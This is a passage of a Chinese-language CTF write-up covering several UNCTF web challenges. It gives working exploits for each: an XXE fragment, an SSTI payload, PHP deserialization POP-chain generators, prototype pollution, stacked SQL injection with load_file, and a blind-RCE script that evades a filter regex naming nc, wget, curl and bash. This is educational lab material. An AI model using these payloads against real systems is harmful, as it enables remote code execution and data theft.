SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;abc&gt;&amp;zeroc;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056716.png" alt=""></p>
<h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy ssti"></a>easy ssti</h3><p>打开靶机是一个登录界面，试着登陆一下<code>&#123;&#123;7*7&#125;&#125;</code>：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056689.png" alt=""></p>
<p>发现存在模板注入漏洞，注入点在<code>Username</code>。</p>
<p>一些关键字被过滤，利用字符串拼接绕过即可，很基础的SSTI。</p>
<p>最后可在<code>env</code>中找到flag。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">user=&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__bas&#x27;</span><span class="string">&#x27;es__&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;__subcla&#x27;</span><span class="string">&#x27;sses__&#x27;</span>]()[<span class="number">108</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;&amp;pwd=</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056392.png" alt=""></p>
<h3 id="ezunseri"><a href="#ezunseri" class="headerlink" title="ezunseri"></a>ezunseri</h3><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;1!5!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="string">&quot;test123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot; JUST FOR FUN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;UNCTF&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="variable language_">$this</span>-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code = <span class="string">&#x27;3.1415926&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key-&gt;name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[pop]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一道PHP反序列化的题。</p>
<p>首先利用点在<code>Exec</code>的<code>execute</code>方法中，在<code>__invoke()</code>中调用了这个方法，那么就需要寻找<code>__invoke()</code>的触发点，发现<code>Test</code>的<code>__toString()</code>中存在利用点，而<code>Exec</code>中的<code>__get()</code>存在<code>echo</code>可以触发<code>__toString()</code>，刚好在<code>Login</code>的<code>__destruct()</code>中可以出发<code>__get()</code>方法，那么利用链就形成了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Login::__destruct()--&gt;Exec::__get()--&gt;Test::__toString()--&gt;Exec::__invoke()--&gt;Exec::execute()</span><br></pre></td></tr></table></figure>
<p>这里需要注意传参需要进行<code>url</code>编码，因为存在<code>private</code>变量，还需要在传参时修改一下<code>Exec</code>类的成员数目来绕过<code>__wakeup()</code>。</p>
<p>生成payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot; JUST FOR FUN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title class_">Exec</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;content = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;content-&gt;test = <span class="keyword">new</span> <span class="title class_">Exec</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;content-&gt;test-&gt;content = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop=O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3BN%3Bs%3A4%3A%22code%22%3Bs%3A13%3A%22+JUST+FOR+FUN%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A2%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7Ds%3A3%3A%22key%22%3BN%3B%7D%7D%7D</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055856.png" alt=""></p>
<h3 id="poppop"><a href="#poppop" class="headerlink" title="poppop"></a>poppop</h3><p>打开靶机后访问<code>index.php</code>，</p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key2-&gt;<span class="title function_ invoke__">abab</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>与上一道题类似，这里就直接写利用链了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B::__destruct()--&gt;C::__toString()--&gt;A::__call()</span><br></pre></td></tr></table></figure>
<p>生成payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key2 = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;code = <span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc=O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%27env%27%29%3B%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure>
<p>这里同样需要修改一下A的成员变量数目来绕过<code>__wakeup()</code>。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055366.png" alt=""></p>
<h3 id="babynode"><a href="#babynode" class="headerlink" title="babynode"></a>babynode</h3><p>怎么说，一道基础到不能再基础的原型链污染。</p>
<p>题目源码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">	<span class="keyword">var</span> admin = &#123;&#125;;</span><br><span class="line">	<span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">catch</span> (error)&#123;</span><br><span class="line">		res.<span class="title function_">send</span>(<span class="string">&quot;copy error&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(admin.<span class="property">id</span>===<span class="string">&#x27;unctf&#x27;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">end</span>(flag);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这里我们需要使<code>admin.id</code>的值为<code>unctf</code>来得到flag，直接利用<code>copy</code>函数污染即可。</p>
<p>payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;unctf&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055174.png" alt=""></p>
<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>打开靶机：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055117.png" alt=""></p>
<p>试着get传参<code>/?id=1</code>，得到：<img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055980.png" alt=""></p>
<p>这里之后尝试使用堆叠注入，关键字被过滤大写绕过即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055236.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055202.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055121.png" alt=""></p>
<p>发现flag并不在库中，这时候就需要想到利用<code>load_file()</code>了，果然一句话就够了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27;;SELECT+load_file(&#x27;</span><span class="operator">/</span>flag<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055719.png" alt=""></p>
<h3 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h3><p>打开靶机审源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\@|\#|\%|:|&amp;|;|\\\\|&quot;|\&#x27;|`|\.|\&amp;|\*|&gt;|&lt;|nc|wget|bash|sh|netcat|grep|base64|rev|curl|wget|php|ping|cat|fl|mkdir/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$code</span>,<span class="variable">$output</span>,<span class="variable">$return_val</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$return_val</span>)   <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">                    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;小黑子,露出只因脚了吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目提示<code>rce布尔盲注</code>，由于<code>exec()</code>函数执行无回显，我们不能直接通过命令执行得到flag，这时候就需要利用bash语言的特性结合类似于sql盲注的手法来获取想要的信息。</p>
<p>这里知道flag在根目录下，可以利用<code>uniq</code>或者<code>paste</code>来读，<code>cut -c</code>来读取每一个字符，flag被过滤可以利用Shell<code>特殊变量$1、$2</code>等来绕过，分号用<code>%0a</code>绕过即可。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://8e7459ce-2b24-4e22-a86a-94a70cf498ba.node.yuzhian.com.cn/?&quot;</span></span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;-1234567890&#125;&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">&quot;code=if [ $(uniq /f$1lag | cut -c &#123;&#125;) == &#123;&#125; ]%0athen sleep 3%0afi&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        u = url + payload</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        re = requests.get(u)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="keyword">if</span> t2 - t1 &gt; <span class="number">2</span>:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># UNCTF&#123;a7e1673b-7be3-496d-8914-ae263e23a562&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="世界和平"><a href="#世界和平" class="headerlink" title="世界和平"></a>世界和平</h3><p>打开靶机，发现又是一个SQL注入的题，提示堆叠注入。</p>
<p>实际上这道题的后端过滤很容易被猜出来，对没有经过处理的关键字如<code>select、from、where</code>等会直接过滤，而对于大写的<code>SELECT、FROM、WHERE</code>等则只会被<code>replace</code>掉一次，我们可以试验一下：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055696.png" alt=""></p>
<p>可以看见我们在<code>show</code>后面加上<code>SELECT</code>命令仍然正常执行，那么思路就很明显了，双写绕过即可。</p>
<p>首先找到flag在哪：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055893.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055288.png" alt=""></p>
<p>然后直接查询flag即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055265.png" alt=""></p>
<h3 id="Sqlsql"><a href="#Sqlsql" class="headerlink" title="Sqlsql"></a>Sqlsql</h3><p>题目给了源码，首先可以审一下源码。</p>
<p>首先在<code>init.sql</code>中可以看见数据库的配置信息，在<code>score.php</code>中发现了flag的信息：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055241.png" alt=""></p>
<p>也就是说我们只需要以<code>admin</code>的身份登录并查询一个已有用户的成绩即可得到flag，那么问题就变成了如何以admin的身份登录。</p>
